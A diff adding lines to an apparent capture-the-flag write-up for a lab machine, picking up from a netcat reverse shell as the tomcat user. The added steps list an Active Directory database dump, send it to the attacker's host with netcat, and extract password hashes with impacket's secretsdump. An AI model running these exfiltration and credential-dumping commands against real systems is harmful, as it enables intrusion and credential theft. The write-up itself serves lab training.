@@ -75,7 +75,20 @@ And on my netcat listener I get a shell as tomcat:
 Ncat: Connection from 10.10.10.55:56108.
 id
 uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls
+ls
+20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+I send these files over to my local box:
+Receiver
+└─# nc -lvnp 4444 > test.dit
+└─# nc -lvnp 4444 > test.bin
+Sender
+tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.18 4444 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.18 4444 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+└─# python /opt/impacket/examples/secretsdump.py -ntds test.dit -system test.bin
 
+Impacket issue : http://5.9.10.113/66087250/fix-for-kali-impacket-issues-between-python-2-and-3-2020-4
 
 A good reference here:
 https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74
